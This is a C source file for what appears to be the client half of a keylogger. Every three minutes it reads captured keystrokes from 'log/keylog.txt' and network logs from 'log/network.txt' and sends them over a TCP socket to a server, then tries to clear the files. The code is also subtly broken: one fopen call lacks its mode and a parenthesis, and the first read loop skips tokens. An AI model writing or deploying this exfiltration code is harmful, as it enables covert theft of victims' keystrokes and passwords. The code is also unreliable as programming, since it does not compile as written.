#include <stdio.h>
#include <stdlib.h>

#include "client.h"

#define BUFFER_SIZE 4096

void start_client(void)
{
    // Variables
    int sock, read_size, ret;
    struct sockaddr_in server;
    char send_buffer[BUFFER_SIZE];
    struct stat stat_buf;
    
    char *addr = "127.0.0.1";  // localhost
    short port = 8888;
    
    // Create a socket. Return value is a file descriptor for the socket.
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Error creating socket\n");
        exit(0);
    }
    printf("Client socket created\n");
    
    // Set the server ip address, connection family and port
    server.sin_addr.s_addr = inet_addr(addr);
    server.sin_family      = AF_INET;
    server.sin_port        = htons(port);
    
    // Connect to remote server
    if (connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0) {
        perror("Error establishing connection\n");
        close(sock);
        exit(0);
    }
    printf("Connecting to server...\n");
    
    while(1)
    {
        sleep(180); // wait 180sec = 3 min before sending logs again
        int bytes_sent=0;
        
        memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
        /*Open keylog file for writing*/
        FILE *keylog_log = fopen("log/keylog.txt", "r");
        /*Write keylog file*/
        while(fscanf(keylog_log,"%s",send_buffer) != EOF)
        {
            fscanf(keylog_log,"%s",send_buffer);
            ret = write(sock, &send_buffer, sizeof(send_buffer));
            if(ret <=0){
                perror("Error writing keylog log\n");
                close(sock);
                exit(0);
            }
        }

        /*Clear and close keylog file*/
        fclose(fopen("log/keylog.txt");
        
        memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
        /*Open network_log file for writing*/
        FILE *network_log = fopen("log/network.txt", "r");
        /*Write keylog file*/
        while(fscanf(network_log,"%s",send_buffer) != EOF)
        {
            ;
            ret = write(sock, &send_buffer, sizeof(send_buffer));
            if(ret <=0){
                perror("Error writing network log\n");
                close(sock);
                exit(0);
            }
        }
        /*Clear and close keylog file*/
        fclose(fopen("log/network.txt"));
    }
    close(sock);
}


